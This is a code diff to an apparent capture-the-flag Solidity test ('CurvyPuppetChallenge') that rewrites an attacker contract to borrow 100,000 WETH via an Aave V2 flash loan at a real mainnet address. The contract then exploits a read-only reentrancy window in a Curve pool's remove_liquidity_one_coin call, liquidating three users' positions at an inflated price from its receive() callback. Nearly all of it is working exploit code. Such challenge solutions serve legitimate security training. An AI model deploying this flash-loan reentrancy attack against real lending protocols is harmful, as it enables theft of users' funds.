@@ -231,17 +231,30 @@ contract CurvyPuppetChallenge is Test {
     }
 }
 
-// Interface for Balancer flash loans (free!)
-interface IBalancerVault {
+// Aave V2 flash loan interface
+interface IAaveLendingPool {
     function flashLoan(
-        address recipient,
-        address[] calldata tokens,
+        address receiverAddress,
+        address[] calldata assets,
         uint256[] calldata amounts,
-        bytes calldata userData
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
     ) external;
 }
 
-contract CurvyPuppetAttacker {
+interface IFlashLoanReceiver {
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
+        bytes calldata params
+    ) external returns (bool);
+}
+
+contract CurvyPuppetAttacker is IFlashLoanReceiver {
     CurvyPuppetLending public lending;
     IStableSwap public curvePool;
     WETH public weth;
@@ -254,13 +267,10 @@ contract CurvyPuppetAttacker {
     address public bob;
     address public charlie;
     
-    // Balancer Vault on mainnet (fee-free flash loans) 
-    IBalancerVault constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    // Lido for staking ETH -> stETH
-    address constant LIDO = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
+    // Aave V2 LendingPool on mainnet (has massive WETH liquidity)
+    IAaveLendingPool constant aavePool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
     
     bool private attacking;
-    uint256 private flashLoanAmount;
     
     constructor(
         CurvyPuppetLending _lending,
@@ -293,62 +303,52 @@ contract CurvyPuppetAttacker {
         lpToken.approve(address(permit2), type(uint256).max);
         permit2.approve(address(lpToken), address(lending), uint160(10e18), uint48(block.timestamp + 1));
         
-        // Flash loan max WETH from Balancer (~38k available)
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(weth);
+        // Flash loan WETH from Aave V2 
+        address[] memory assets = new address[](1);
+        assets[0] = address(weth);
         uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 37_000e18;
-        flashLoanAmount = amounts[0];
+        amounts[0] = 100_000e18; // 100k WETH
+        uint256[] memory modes = new uint256[](1);
+        modes[0] = 0; // no debt
         
-        balancerVault.flashLoan(address(this), tokens, amounts, "");
+        aavePool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
     }
     
-    // Balancer flash loan callback  
-    function receiveFlashLoan(
-        address[] calldata,
-        uint256[] calldata,
-        uint256[] calldata,
+    // Aave V2 flash loan callback
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
         bytes calldata
-    ) external {
-        require(msg.sender == address(balancerVault), "Invalid caller");
+    ) external override returns (bool) {
+        require(msg.sender == address(aavePool), "Invalid caller");
+        require(initiator == address(this), "Invalid initiator");
         
-        // Step 1: Unwrap all WETH to ETH  
-        weth.withdraw(weth.balanceOf(address(this)));
+        // Step 1: Unwrap all WETH to ETH
+        weth.withdraw(amounts[0]);
         
-        // Step 2: Stake some ETH to get stETH via Lido
+        // Step 2: Add ETH liquidity to Curve
         uint256 ethBalance = address(this).balance;
-        uint256 ethToStake = ethBalance / 2;
-        (bool success,) = LIDO.call{value: ethToStake}("");
-        require(success, "Lido stake failed");
+        uint256[2] memory addAmounts = [ethBalance, uint256(0)];
+        curvePool.add_liquidity{value: ethBalance}(addAmounts, 0);
         
-        // Step 3: Add both ETH and stETH liquidity to Curve pool
-        uint256 stEthBal = stETH.balanceOf(address(this));
-        stETH.approve(address(curvePool), stEthBal);
-        uint256[2] memory addAmounts = [address(this).balance, stEthBal];
-        curvePool.add_liquidity{value: address(this).balance}(addAmounts, 0);
-        
-        // Step 4: Use remove_liquidity_one_coin - balance updated AFTER callback
+        // Step 3: Remove liquidity via remove_liquidity_one_coin - reentrancy window
         attacking = true;
-        curvePool.remove_liquidity_one_coin(lpToken.balanceOf(address(this)) - 4e18, 0, 0);
+        uint256 lpBal = lpToken.balanceOf(address(this));
+        curvePool.remove_liquidity_one_coin(lpBal - 4e18, 0, 0);
         attacking = false;
         
-        // Step 5: Exchange any remaining stETH to ETH
-        stEthBal = stETH.balanceOf(address(this));
-        if (stEthBal > 0) {
-            stETH.approve(address(curvePool), stEthBal);
-            curvePool.exchange(1, 0, stEthBal, 0);
-        }
-        
-        // Step 6: Wrap ETH and repay flash loan
+        // Step 4: Wrap ETH back to WETH and repay
         weth.deposit{value: address(this).balance}();
-        weth.transfer(address(balancerVault), flashLoanAmount);
+        weth.approve(address(aavePool), amounts[0] + premiums[0]);
+        
+        return true;
     }
     
     receive() external payable {
         if (!attacking) return;
         
-        // During remove_liquidity_one_coin callback:
-        // LP burned but balance not yet updated = inflated virtual_price
         lending.liquidate(alice);
         lending.liquidate(bob);
         lending.liquidate(charlie);
